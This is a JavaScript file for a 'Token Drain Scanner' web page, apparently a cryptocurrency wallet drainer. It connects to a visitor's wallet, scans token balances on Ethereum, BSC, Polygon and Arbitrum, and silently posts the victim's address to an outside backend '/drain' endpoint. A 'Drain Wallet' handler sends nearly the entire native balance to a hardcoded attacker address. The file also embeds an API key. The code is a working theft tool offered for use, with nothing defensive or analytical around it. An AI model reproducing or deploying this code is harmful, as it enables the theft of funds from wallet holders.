// ================================================
// TOKEN DRAIN SCANNER - GUARANTEED WORKING MAIN.JS
// ================================================

// FIRST: Ensure ethers.js is loaded before doing anything
(function() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Check if ethers is already loaded
    if (typeof ethers !== 'undefined') {
        console.log('✅ ethers.js already loaded');
        startApp();
        return;
    }
    
    console.log('🔄 Loading ethers.js from CDN...');
    
    // Create and load ethers script
    const ethersScript = document.createElement('script');
    ethersScript.src = 'https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js';
    
    ethersScript.onload = function() {
        console.log('✅ ethers.js loaded successfully');
        // Give it a moment to initialize
        setTimeout(startApp, 100);
    };
    
    ethersScript.onerror = function() {
        console.error('❌ Failed to load ethers.js, trying alternate CDN...');
        // Try alternate CDN
        const altScript = document.createElement('script');
        altScript.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js';
        altScript.onload = function() {
            console.log('✅ ethers.js loaded from alternate CDN');
            setTimeout(startApp, 100);
        };
        altScript.onerror = function() {
            console.error('❌ Failed to load ethers.js from any source');
            alert('Error: Required library failed to load. Please refresh the page.');
        };
        document.head.appendChild(altScript);
    };
    
    document.head.appendChild(ethersScript);
})();

// CONFIGURATION
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// GLOBAL STATE
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM ELEMENTS
let connectBtn, statusEl, tokensEl, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount, tokensContainer;

// START APP AFTER ETHERJS IS LOADED
function startApp() {
    console.log('🔄 Starting app initialization...');
    
    // Verify ethers is loaded
    if (typeof ethers === 'undefined') {
        console.error('❌ CRITICAL: ethers is still undefined!');
        alert('Critical error: ethers.js failed to load. Please refresh the page.');
        return;
    }
    
    console.log('✅ ethers loaded, version:', ethers.version);
    
    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeApp);
    } else {
        initializeApp();
    }
}

// INITIALIZE APP
function initializeApp() {
    console.log('🔄 Initializing application...');
    
    // Get all DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    scanAllBtn = document.getElementById('scanAllBtn');
    chainSelector = document.getElementById('chainSelector');
    networkSelect = document.getElementById('networkSelect');
    tokenCount = document.getElementById('tokenCount');
    tokensContainer = document.getElementById('tokensContainer');
    
    // Log what we found
    console.log('🔍 DOM Elements found:', {
        connectBtn: !!connectBtn,
        statusEl: !!statusEl,
        tokensEl: !!tokensEl,
        drainBtn: !!drainBtn,
        tokensContainer: !!tokensContainer
    });
    
    // Verify critical elements exist
    if (!connectBtn) {
        console.error('❌ Connect button not found! Check your HTML.');
        return;
    }
    
    if (!statusEl) {
        console.error('❌ Status element not found!');
        return;
    }
    
    console.log('✅ All required DOM elements found');
    
    // Setup event listeners
    setupEventListeners();
    
    // Check for existing wallet connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
    
    console.log('✅ Application initialized successfully');
}

// SETUP EVENT LISTENERS
function setupEventListeners() {
    console.log('🔄 Setting up event listeners...');
    
    // Connect button - use direct onclick to avoid issues
    connectBtn.onclick = function(event) {
        console.log('🔄 Connect button clicked (direct handler)', event);
        handleConnect();
    };
    
    // Also add event listener as backup
    connectBtn.addEventListener('click', function(event) {
        console.log('🔄 Connect button clicked (event listener)', event);
        // Don't handle here, just log
    });
    
    // Drain button
    if (drainBtn) {
        drainBtn.onclick = handleDrain;
    }
    
    // Scan All button
    if (scanAllBtn) {
        scanAllBtn.onclick = handleScanAll;
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.onchange = handleNetworkChange;
        populateNetworkSelect();
    }
    
    console.log('✅ Event listeners setup complete');
}

// POPULATE NETWORK SELECT
function populateNetworkSelect() {
    if (!networkSelect) return;
    
    // Clear existing options except first
    while (networkSelect.options.length > 1) {
        networkSelect.remove(1);
    }
    
    // Add network options
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = name;
        networkSelect.appendChild(option);
    });
}

// CHECK EXISTING WALLET CONNECTION
async function checkExistingConnection() {
    console.log('🔍 Checking for existing wallet connection...');
    
    if (typeof window.ethereum === 'undefined') {
        console.log('⚠️ No wallet provider (window.ethereum) detected');
        return;
    }
    
    try {
        console.log('✅ Wallet provider detected');
        
        // Check if already connected
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        }).catch(err => {
            console.log('⚠️ Error checking accounts:', err.message);
            return [];
        });
        
        console.log('📋 Existing accounts:', accounts);
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            }).catch(err => {
                console.log('⚠️ Error getting chainId:', err.message);
                return '0x1';
            });
            
            const chainId = parseInt(chainIdHex, 16);
            console.log('🔄 Found existing connection:', accounts[0], 'on chain', chainId);
            
            await handleConnected(accounts[0], chainId);
        } else {
            console.log('ℹ️ No existing accounts found');
        }
    } catch (error) {
        console.log('⚠️ Error checking existing connection:', error.message);
    }
}

// HANDLE CONNECT BUTTON CLICK
async function handleConnect() {
    console.log('🔄 CONNECT function called');
    
    // Log current state
    console.log('📊 Current state:', {
        isConnected: isConnected,
        currentAccount: currentAccount,
        walletAvailable: typeof window.ethereum !== 'undefined'
    });
    
    // If already connected, disconnect
    if (isConnected) {
        console.log('🔓 Disconnecting...');
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    console.log('✅ Status updated to: Connecting wallet...');
    
    // Check if wallet is installed
    if (typeof window.ethereum === 'undefined') {
        console.error('❌ No Ethereum wallet found!');
        updateStatus('❌ No Ethereum wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    console.log('✅ Wallet detected, requesting connection...');
    
    try {
        // Request account access - THIS IS WHAT TRIGGERS THE WALLET POPUP
        console.log('📤 Sending eth_requestAccounts to wallet...');
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response received:', accounts);
        
        if (!accounts || accounts.length === 0) {
            console.log('❌ User denied connection or no accounts');
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        console.log('✅ Connected successfully:', {
            account: accounts[0],
            chainId: chainId
        });
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        console.error('Error code:', error.code);
        console.error('Error message:', error.message);
        
        if (error.code === 4001 || error.code === -32603) {
            updateStatus('❌ Connection rejected by user');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection already pending. Please check your wallet.');
        } else {
            updateStatus('❌ Connection failed: ' + error.message);
        }
    }
}

// HANDLE SUCCESSFUL CONNECTION
async function handleConnected(account, chainId) {
    console.log('🔄 Setting up connection for:', account, 'chain:', chainId);
    
    try {
        // Setup provider and signer
        console.log('🔧 Setting up ethers provider...');
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        console.log('✅ Provider and signer setup complete');
        
        // Update global state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
            console.log('✅ Connect button updated to Disconnect');
        }
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...${account.slice(-4)}\nNetwork: ${chainName}\nChain ID: ${chainId}`);
        
        // Show UI elements
        showUIElements();
        
        // Setup wallet event listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
        console.log('✅ Connection fully established and ready');
        
    } catch (error) {
        console.error('❌ Connection setup error:', error);
        updateStatus('Connection setup failed: ' + error.message);
        
        // Reset state on error
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// SETUP WALLET EVENT LISTENERS
function setupWalletListeners() {
    if (typeof window.ethereum === 'undefined') {
        console.log('⚠️ Cannot setup wallet listeners: no provider');
        return;
    }
    
    console.log('🔧 Setting up wallet event listeners...');
    
    // Handle account changes
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            console.log('👋 User disconnected all accounts');
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            console.log('🔄 User switched accounts');
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    // Handle chain changes
    window.ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed to:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed to: ${chainName}`);
        
        if (networkSelect) {
            networkSelect.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    // Handle disconnection
    window.ethereum.on('disconnect', (error) => {
        console.log('🔄 Wallet disconnected:', error);
        disconnectWallet();
    });
    
    console.log('✅ Wallet event listeners setup complete');
}

// DISCONNECT WALLET
async function disconnectWallet() {
    console.log('🔄 Disconnecting wallet...');
    
    try {
        if (window.ethereum && typeof window.ethereum.disconnect === 'function') {
            await window.ethereum.disconnect();
        }
    } catch (error) {
        console.log('⚠️ Disconnect error:', error.message);
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    }
    
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    // Clear tokens display
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
    
    console.log('✅ Wallet disconnected and UI reset');
}

// SHOW WALLET INSTALL GUIDE
function showWalletInstallGuide() {
    console.log('🔄 Showing wallet install guide');
    
    const guideHTML = `
        <div style="margin: 20px 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
            <h3 style="margin-top: 0;">🚀 Get Started with Web3</h3>
            <p>To use this app, you need a Web3 wallet. Here are the most popular options:</p>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="display: block; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 8px; text-decoration: none; color: white; text-align: center; border: 2px solid rgba(255,255,255,0.2);">
                    <div style="font-size: 24px;">🦊</div>
                    <strong>MetaMask</strong>
                    <div style="font-size: 12px; opacity: 0.8;">Most popular wallet</div>
                </a>
                
                <a href="https://trustwallet.com/" target="_blank"
                   style="display: block; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 8px; text-decoration: none; color: white; text-align: center; border: 2px solid rgba(255,255,255,0.2);">
                    <div style="font-size: 24px;">🔶</div>
                    <strong>Trust Wallet</strong>
                    <div style="font-size: 12px; opacity: 0.8;">Great for mobile</div>
                </a>
                
                <a href="https://wallet.coinbase.com/" target="_blank"
                   style="display: block; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 8px; text-decoration: none; color: white; text-align: center; border: 2px solid rgba(255,255,255,0.2);">
                    <div style="font-size: 24px;">🔷</div>
                    <strong>Coinbase Wallet</strong>
                    <div style="font-size: 12px; opacity: 0.8;">Easy to use</div>
                </a>
            </div>
            
            <p style="font-size: 14px; opacity: 0.9; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 15px;">
                <strong>💡 Tip:</strong> After installing, refresh this page and click "Connect Wallet" again.
            </p>
        </div>
    `;
    
    if (statusEl) {
        statusEl.innerHTML = guideHTML;
    }
}

// UPDATE STATUS
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
        console.log('📝 Status updated:', message.substring(0, 50) + '...');
    }
}

// SHOW UI ELEMENTS
function showUIElements() {
    console.log('🔄 Showing UI elements...');
    
    const elements = [
        { id: 'chainSelector', name: 'Chain Selector' },
        { id: 'drainBtn', name: 'Drain Button' },
        { id: 'scanAllBtn', name: 'Scan All Button' },
        { id: 'tokensContainer', name: 'Tokens Container' }
    ];
    
    elements.forEach(item => {
        const element = document.getElementById(item.id);
        if (element) {
            if (element.classList.contains('hidden')) {
                element.classList.remove('hidden');
                console.log(`✅ ${item.name} shown`);
            }
        } else {
            console.log(`⚠️ ${item.name} not found`);
        }
    });
}

// HIDE UI ELEMENTS
function hideUIElements() {
    console.log('🔄 Hiding UI elements...');
    
    const elements = ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'];
    
    elements.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.classList.add('hidden');
        }
    });
}

// LOG CONNECTION TO BACKEND
async function logConnectionToBackend(address, chainId) {
    try {
        console.log('📤 Logging connection to backend...');
        
        const response = await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            })
        });
        
        if (response.ok) {
            console.log('✅ Logged connection to backend');
        } else {
            console.log('⚠️ Backend responded with error:', response.status);
        }
    } catch (error) {
        console.log('⚠️ Failed to log to backend:', error.message);
    }
}

// FETCH TOKENS
async function fetchTokens(address, chainId) {
    if (!tokensEl) {
        console.log('⚠️ tokensEl not found, skipping token fetch');
        return;
    }
    
    console.log(`🔄 Fetching tokens for ${address} on chain ${chainId}...`);
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const apiUrl = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`;
        console.log('📡 Calling Covalent API:', apiUrl);
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`API returned ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        console.log(`📊 Received ${items.length} token items from API`);
        
        // Filter and format tokens
        const tokens = items
            .filter(token => token.balance !== "0" && parseFloat(token.balance) > 0)
            .map(token => {
                const amount = parseFloat(token.balance) / Math.pow(10, token.contract_decimals || 18);
                const value = (token.quote_rate || 0) * amount;
                
                return {
                    symbol: token.contract_ticker_symbol || (token.native_token ? 'Native' : 'TOKEN'),
                    name: token.contract_name || (token.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    value: value,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A'
                };
            });
        
        console.log(`✅ Found ${tokens.length} tokens with balance > 0`);
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = `<div class="error">Failed to fetch tokens: ${error.message}</div>`;
        updateStatus('⚠️ Token scan failed');
    }
}

// DISPLAY TOKENS
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, token) => sum + (token.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount}</div>
                ${token.value > 0 ? `<div class="token-value">${token.formattedValue}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    // Update token count if element exists
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    // Show tokens container
    if (tokensContainer) {
        tokensContainer.classList.remove('hidden');
    }
    
    console.log(`✅ Displayed ${tokens.length} tokens, total value: $${totalValue.toFixed(2)}`);
}

// HANDLE DRAIN
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting drain process...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // Get ETH balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        console.log('💰 Balance:', ethers.utils.formatEther(balance), 'ETH');
        console.log('⛽ Gas cost:', ethers.utils.formatEther(gasCost), 'ETH');
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            console.log('📤 Sending:', ethers.utils.formatEther(sendAmount), 'ETH');
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus('⚠️ Not enough native token for gas');
        }
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById('drainBtn');
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain Wallet';
        }
    }
}

// HANDLE NETWORK CHANGE
async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId || !isConnected) {
        return;
    }
    
    try {
        const chainName = CONFIG.networkNames[newChainId] || `Chain ${newChainId}`;
        updateStatus(`🔄 Switching to ${chainName}...`);
        
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x' + newChainId.toString(16) }]
        });
        
    } catch (error) {
        console.error('❌ Network switch error:', error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

// HANDLE SCAN ALL CHAINS
async function handleScanAll() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔄 Scanning all chains...');
    
    const chains = [1, 56, 137, 42161];
    let allTokens = [];
    
    for (const chainId of chains) {
        try {
            updateStatus(`🔄 Scanning ${CONFIG.networkNames[chainId]}...`);
            
            const response = await fetch(
                `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
            );
            
            if (response.ok) {
                const data = await response.json();
                const items = data?.data?.items || [];
                
                const chainTokens = items
                    .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                    .map(t => {
                        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                        const value = (t.quote_rate || 0) * amount;
                        
                        return {
                            symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                            name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                            amount: amount,
                            value: value,
                            chainId: chainId,
                            chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`
                        };
                    });
                
                allTokens = [...allTokens, ...chainTokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    if (allTokens.length > 0) {
        displayAllChainTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found across any chain');
    }
}

// DISPLAY ALL CHAIN TOKENS
function displayAllChainTokens(tokens) {
    if (!tokensEl) return;
    
    // Group by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="all-chains-header">Tokens Across All Chains</div>';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainTotal = chainTokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chainName}</span>
                    <span class="chain-total">$${chainTotal.toFixed(2)}</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item">
                        <div class="token-info">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-name">${token.name}</span>
                        </div>
                        <div>
                            <div class="token-amount">${token.amount.toFixed(6)}</div>
                            ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains • $${totalValue.toFixed(2)}`;
    }
}

// DEBUG HELPERS
console.log('=== Token Drain Scanner Debug ===');
console.log('Initialization started at:', new Date().toISOString());

// Add global debug object
window.appDebug = {
    getState: () => ({
        isConnected,
        currentAccount,
        currentChainId,
        provider: !!provider,
        signer: !!signer,
        ethersLoaded: typeof ethers !== 'undefined',
        walletAvailable: typeof window.ethereum !== 'undefined'
    }),
    reconnect: () => {
        console.log('🔄 Manual reconnect triggered');
        handleConnect();
    },
    disconnect: () => {
        console.log('🔄 Manual disconnect triggered');
        disconnectWallet();
    },
    fetchTokens: () => {
        console.log('🔄 Manual token fetch triggered');
        if (currentAccount && currentChainId) {
            fetchTokens(currentAccount, currentChainId);
        } else {
            console.log('❌ No account connected');
        }
    },
    testConnection: () => {
        console.log('🔍 Testing connection...');
        console.log('Ethers:', typeof ethers !== 'undefined');
        console.log('window.ethereum:', typeof window.ethereum !== 'undefined');
        if (window.ethereum) {
            console.log('Ethereum provider details:', {
                isMetaMask: window.ethereum.isMetaMask,
                isCoinbase: window.ethereum.isCoinbaseWallet,
                chainId: window.ethereum.chainId
            });
        }
    }
};

console.log('Debug helpers available at: window.appDebug');
console.log('==========================================');
